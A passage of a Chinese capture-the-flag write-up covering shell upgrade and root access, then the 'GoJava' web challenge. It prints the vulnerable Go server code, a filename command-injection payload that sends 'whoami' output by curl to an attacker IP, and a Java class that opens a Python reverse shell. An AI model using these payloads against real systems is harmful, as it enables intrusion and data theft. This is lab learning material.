<p>也就是说，知道了root密码就可以了，那就需要信息搜集一下，发现/home/admin目录下存在passwd，说是密码就是goku的MD5值。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527202721909.png" alt="image-20240527202721909"></p>
<p>但知道了密码，运行su却不行，因为这不是交互式shell，这里说必须在一个终端运行，也就是交互式shell</p>
<p>google一手， 发现可以通过script脚本实现</p>
<pre><code class="hljs scss">/usr/bin/script -qc /bin/bash /dev/null</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527203007810.png" alt="image-20240527203007810"></p>
<p>切换到root之后，读取即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527203038006.png" alt="image-20240527203038006"></p>
<h1 id="web-gojava">WEB-GoJava</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527214316741.png" alt="image-20240527214316741"></p>
<p>扫目录发现两个文件，访问看看，这里main.go显示无权访问，访问另一个zip得到部分源码</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"io"</span>
	<span class="hljs-string">"log"</span>
	<span class="hljs-string">"mime/multipart"</span>
	<span class="hljs-string">"net/http"</span>
	<span class="hljs-string">"os"</span>
	<span class="hljs-string">"strings"</span>
)

<span class="hljs-keyword">var</span> blacklistChars = []<span class="hljs-type">rune</span>{<span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'\''</span>, <span class="hljs-string">'\\'</span>, <span class="hljs-string">'?'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-string">'{'</span>, <span class="hljs-string">'}'</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r'</span>}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	<span class="hljs-comment">// 设置路由</span>
	http.HandleFunc(<span class="hljs-string">"/gojava"</span>, compileJava)

	<span class="hljs-comment">// 设置静态文件服务器</span>
	fs := http.FileServer(http.Dir(<span class="hljs-string">"."</span>))
	http.Handle(<span class="hljs-string">"/"</span>, fs)

	<span class="hljs-comment">// 启动服务器</span>
	log.Println(<span class="hljs-string">"Server started on :80"</span>)
	log.Fatal(http.ListenAndServe(<span class="hljs-string">":80"</span>, <span class="hljs-literal">nil</span>))
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isFilenameBlacklisted</span><span class="hljs-params">(filename <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> {
	<span class="hljs-keyword">for</span> _, char := <span class="hljs-keyword">range</span> filename {
		<span class="hljs-keyword">for</span> _, blackChar := <span class="hljs-keyword">range</span> blacklistChars {
			<span class="hljs-keyword">if</span> char == blackChar {
				<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
			}
		}
	}
	<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">compileJava</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
	<span class="hljs-comment">// 检查请求方法是否为POST</span>
	<span class="hljs-keyword">if</span> r.Method != http.MethodPost {
		http.Error(w, <span class="hljs-string">"Method not allowed"</span>, http.StatusMethodNotAllowed)
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// 解析multipart/form-data格式的表单数据</span>
	err := r.ParseMultipartForm(<span class="hljs-number">10</span> &lt;&lt; <span class="hljs-number">20</span>) <span class="hljs-comment">// 设置最大文件大小为10MB</span>
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(w, <span class="hljs-string">"Error parsing form"</span>, http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// 从表单中获取上传的文件</span>
	file, handler, err := r.FormFile(<span class="hljs-string">"file"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(w, <span class="hljs-string">"Error retrieving file"</span>, http.StatusBadRequest)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">defer</span> file.Close()

	<span class="hljs-keyword">if</span> isFilenameBlacklisted(handler.Filename) {
		http.Error(w, <span class="hljs-string">"Invalid filename: contains blacklisted character"</span>, http.StatusBadRequest)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="hljs-string">".java"</span>) {
		http.Error(w, <span class="hljs-string">"Invalid file format, please select a .java file"</span>, http.StatusBadRequest)
		<span class="hljs-keyword">return</span>
	}
	err = saveFile(file, <span class="hljs-string">"./upload/"</span>+handler.Filename)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(w, <span class="hljs-string">"Error saving file"</span>, http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">saveFile</span><span class="hljs-params">(file multipart.File, filePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> {
	<span class="hljs-comment">// 创建目标文件</span>
	f, err := os.Create(filePath)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> err
	}
	<span class="hljs-keyword">defer</span> f.Close()

	<span class="hljs-comment">// 将上传的文件内容复制到目标文件中</span>
	_, err = io.Copy(f, file)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
}</code></pre>
<p>逻辑也简单，有一个黑名单，然后开了个服务器。先判断请求访问是否为post，否则是无效的，之后获取上传的文件，验证文件名称是否包含了黑名单，规定文件后缀必须为.java，然后调用savefile保存文件</p>
<p>这里第一次遇见文件上传的文件名filename进行RCE（这里可能就是因为黑名单处理而联想到的）至于原理我还不懂，有的师傅是这样理解的：</p>
<pre><code class="hljs scss">就是猜测开发 java 编译这个功能是使用命令编译的后面可以命令拼接</code></pre>
<p>看官方wp给的payload：</p>
<pre><code class="hljs scss">filename="<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.java</span>||curl -X POST -d <span class="hljs-selector-tag">a</span>=`whoami` <span class="hljs-selector-attr">[Your-IP]</span>:<span class="hljs-number">8888</span>||.java<span class="hljs-string">"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527215939107.png" alt="image-20240527215939107"></p>
<p>可以看到回显</p>
<pre><code class="hljs scss"><span class="hljs-selector-tag">var</span> blacklistChars = <span class="hljs-selector-attr">[]</span>rune{'&lt;', '&gt;', '"', '\'', '\\', '?', '*', '{', '}', '\t', '\n', '\r'}</code></pre>
<p>黑名单如上，无法反弹shell进行RCE，只能一次次看回显，这里用base64的原因就在于，想让回显的内容在一行当中显示出来，否则只有个ls，只能显示出数据的第一行</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527220555791.png" alt="image-20240527220555791"></p>
<pre><code class="hljs scss">css
final
go<span class="hljs-selector-class">.mod</span>
gojava
index<span class="hljs-selector-class">.html</span>
js
<span class="hljs-selector-tag">main</span>-old<span class="hljs-selector-class">.zip</span>
<span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.go</span>
robots<span class="hljs-selector-class">.txt</span>
upload</code></pre>
<p>之后查看main.go</p>
<pre><code class="hljs py">package main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"io"</span>
	<span class="hljs-string">"log"</span>
	<span class="hljs-string">"math/rand"</span>
	<span class="hljs-string">"mime/multipart"</span>
	<span class="hljs-string">"net/http"</span>
	<span class="hljs-string">"os"</span>
	<span class="hljs-string">"os/exec"</span>
	<span class="hljs-string">"path/filepath"</span>
	<span class="hljs-string">"strconv"</span>
	<span class="hljs-string">"strings"</span>
	<span class="hljs-string">"time"</span>
)

var blacklistChars = []rune{<span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'\''</span>, <span class="hljs-string">'\\'</span>, <span class="hljs-string">'?'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-string">'{'</span>, <span class="hljs-string">'}'</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r'</span>}

func main() {
	// 设置路由
	http.HandleFunc(<span class="hljs-string">"/gojava"</span>, compileJava)
	http.HandleFunc(<span class="hljs-string">"/testExecYourJarOnServer"</span>, testExecYourJarOnServer)

	// 设置静态文件服务器
	fs := http.FileServer(http.Dir(<span class="hljs-string">"."</span>))
	http.Handle(<span class="hljs-string">"/"</span>, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// 检查请求的路径是否需要被禁止访问
		<span class="hljs-keyword">if</span> isForbiddenPath(r.URL.Path) {
			http.Error(w, <span class="hljs-string">"Forbidden"</span>, http.StatusForbidden)
			<span class="hljs-keyword">return</span>
		}

		// 否则，继续处理其他请求
		fs.ServeHTTP(w, r)
	}))

	// 启动服务器
	log.Println(<span class="hljs-string">"Server started on :80"</span>)
	log.Fatal(http.ListenAndServe(<span class="hljs-string">":80"</span>, nil))
}

func isForbiddenPath(path string) <span class="hljs-built_in">bool</span> {
	// 检查路径是否为某个特定文件或文件夹的路径
	// 这里可以根据你的需求进行设置
	forbiddenPaths := []string{
		<span class="hljs-string">"/main.go"</span>,
		<span class="hljs-string">"/upload/"</span>,
	}

	// 检查请求的路径是否与禁止访问的路径匹配
	<span class="hljs-keyword">for</span> _, forbiddenPath := <span class="hljs-built_in">range</span> forbiddenPaths {
		<span class="hljs-keyword">if</span> strings.HasPrefix(path, forbiddenPath) {
			<span class="hljs-keyword">return</span> true
		}
	}

	<span class="hljs-keyword">return</span> false
}

func isFilenameBlacklisted(filename string) <span class="hljs-built_in">bool</span> {
	<span class="hljs-keyword">for</span> _, char := <span class="hljs-built_in">range</span> filename {
		<span class="hljs-keyword">for</span> _, blackChar := <span class="hljs-built_in">range</span> blacklistChars {
			<span class="hljs-keyword">if</span> char == blackChar {
				<span class="hljs-keyword">return</span> true
			}
		}
	}
	<span class="hljs-keyword">return</span> false
}

// compileJava 处理上传并编译Java文件的请求
func compileJava(w http.ResponseWriter, r *http.Request) {
	// 检查请求方法是否为POST
	<span class="hljs-keyword">if</span> r.Method != http.MethodPost {
		http.Error(w, <span class="hljs-string">"Method not allowed"</span>, http.StatusMethodNotAllowed)
		<span class="hljs-keyword">return</span>
	}

	// 解析multipart/form-data格式的表单数据
	err := r.ParseMultipartForm(<span class="hljs-number">10</span> &lt;&lt; <span class="hljs-number">20</span>) // 设置最大文件大小为10MB
	<span class="hljs-keyword">if</span> err != nil {
		http.Error(w, <span class="hljs-string">"Error parsing form"</span>, http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}

	// 从表单中获取上传的文件
	file, handler, err := r.FormFile(<span class="hljs-string">"file"</span>)
	<span class="hljs-keyword">if</span> err != nil {
		http.Error(w, <span class="hljs-string">"Error retrieving file"</span>, http.StatusBadRequest)
		<span class="hljs-keyword">return</span>
	}
	defer file.Close()

	<span class="hljs-keyword">if</span> isFilenameBlacklisted(handler.Filename) {
		http.Error(w, <span class="hljs-string">"Invalid filename: contains blacklisted character"</span>, http.StatusBadRequest)
		<span class="hljs-keyword">return</span>
	}

	// 检查文件扩展名是否为.java
	<span class="hljs-keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="hljs-string">".java"</span>) {
		http.Error(w, <span class="hljs-string">"Invalid file format, please select a .java file"</span>, http.StatusBadRequest)
		<span class="hljs-keyword">return</span>
	}

	// 保存上传的文件至./upload文件夹
	err = saveFile(file, <span class="hljs-string">"./upload/"</span>+handler.Filename)
	<span class="hljs-keyword">if</span> err != nil {
		http.Error(w, <span class="hljs-string">"Error saving file"</span>, http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}

	// 生成随机文件名
	rand.Seed(time.Now().UnixNano())
	randomName := strconv.FormatInt(rand.Int63(), <span class="hljs-number">16</span>) + <span class="hljs-string">".jar"</span>

	// 编译Java文件
	cmd := <span class="hljs-string">"javac ./upload/"</span> + handler.Filename
	compileCmd := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-string">"sh"</span>, <span class="hljs-string">"-c"</span>, cmd)
	//compileCmd := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-string">"javac"</span>, <span class="hljs-string">"./upload/"</span>+handler.Filename)
	compileOutput, err := compileCmd.CombinedOutput()
	<span class="hljs-keyword">if</span> err != nil {
		http.Error(w, <span class="hljs-string">"Error compiling Java file: "</span>+string(compileOutput), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}

	// 将编译后的.<span class="hljs-keyword">class</span>文件打包成.jar文件
	fileNameWithoutExtension := strings.TrimSuffix(handler.Filename, filepath.Ext(handler.Filename))
	jarCmd := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-string">"jar"</span>, <span class="hljs-string">"cvfe"</span>, <span class="hljs-string">"./final/"</span>+randomName, fileNameWithoutExtension, <span class="hljs-string">"-C"</span>, <span class="hljs-string">"./upload"</span>, strings.TrimSuffix(handler.Filename, <span class="hljs-string">".java"</span>)+<span class="hljs-string">".class"</span>)
	jarOutput, err := jarCmd.CombinedOutput()
	<span class="hljs-keyword">if</span> err != nil {
		http.Error(w, <span class="hljs-string">"Error creating JAR file: "</span>+string(jarOutput), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}

	// 返回编译后的.jar文件的下载链接
	fmt.Fprintf(w, <span class="hljs-string">"/final/%s"</span>, randomName)
}

// saveFile 保存上传的文件
func saveFile(file multipart.File, filePath string) error {
	// 创建目标文件
	f, err := os.Create(filePath)
	<span class="hljs-keyword">if</span> err != nil {
		<span class="hljs-keyword">return</span> err
	}
	defer f.Close()

	// 将上传的文件内容复制到目标文件中
	_, err = io.Copy(f, file)
	<span class="hljs-keyword">if</span> err != nil {
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-keyword">return</span> nil
}

func testExecYourJarOnServer(w http.ResponseWriter, r *http.Request) {
	jarFile := <span class="hljs-string">"./final/"</span> + r.URL.Query().Get(<span class="hljs-string">"jar"</span>)

	// 检查是否存在指定的.jar文件
	<span class="hljs-keyword">if</span> !strings.HasSuffix(jarFile, <span class="hljs-string">".jar"</span>) {
		http.Error(w, <span class="hljs-string">"Invalid jar file format"</span>, http.StatusBadRequest)
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-keyword">if</span> _, err := os.Stat(jarFile); os.IsNotExist(err) {
		http.Error(w, <span class="hljs-string">"Jar file not found"</span>, http.StatusNotFound)
		<span class="hljs-keyword">return</span>
	}

	// 执行.jar文件
	cmd := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-string">"java"</span>, <span class="hljs-string">"-jar"</span>, jarFile)
	output, err := cmd.CombinedOutput()
	<span class="hljs-keyword">if</span> err != nil {
		http.Error(w, <span class="hljs-string">"Error running jar file: "</span>+string(output), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}

	// 输出结果
	w.Header().<span class="hljs-type">Set</span>(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"text/plain"</span>)
	w.Write(output)
}</code></pre>
<p>这里看到最后的执行.jar文件，就能知道，上传一个能反弹shell的jar文件即可</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.InputStreamReader;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        String[] cmd = { <span class="hljs-string">"python3"</span>, <span class="hljs-string">"-c"</span>,
                <span class="hljs-string">"import os,pty,socket;s=socket.socket();s.connect((\"ip\", 5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")"</span> };

        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> processBuilder.start();

            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));
            String line;
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                System.out.println(line);
            }

            <span class="hljs-type">int</span> <span class="hljs-variable">exitCode</span> <span class="hljs-operator">=</span> process.waitFor();
            System.out.println(<span class="hljs-string">"Exited with code: "</span> + exitCode);
        } <span class="hljs-keyword">catch</span> (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}</code></pre>
<p>上传之后，访问testExecYourJarOnServer路由，对jar进行get传参即可，拿到shell，之后查看根目录发现备忘录，cat读取发现是一串密文，直接尝试su登录root，输入密文得到root</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527223132673.png" alt="image-20240527223132673"></p>
</article>

  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
</aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
